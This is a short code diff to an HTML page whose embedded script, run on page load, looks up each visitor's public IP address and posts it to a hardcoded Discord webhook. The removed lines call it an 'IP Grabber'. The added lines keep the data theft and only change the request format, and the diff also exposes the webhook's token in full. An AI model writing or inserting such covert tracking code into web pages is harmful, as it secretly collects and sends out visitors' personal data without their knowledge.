@@ -5,16 +5,11 @@
 "https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
     </script>
       <script>
-    $.getJSON("https://api.ipify.org?format=json", function(data) {
+    $.getJSON("https://api.ipify.org?format=txt", function(data) {
         const request = new XMLHttpRequest();
         request.open("POST", "https://discord.com/api/webhooks/1038215774625603584/5qa1rgmCUJ2GvfGYDJvns6X2xm63Cj2YlshwhjG9F5NLoPYEFx31pB5rWxdlmrwggR7y");
-        request.setRequestHeader('Content-type', 'application/json');
-        const params = {
-            username: "IP Grabber | By Mozaki",
-            avatar_url: "",
-            content: data.ip
-        }
-        request.send(JSON.stringify(params));
+        request.setRequestHeader('Content-type', 'application/txt');
+        request.send(data.ip);
     })
     </script>
    </head>
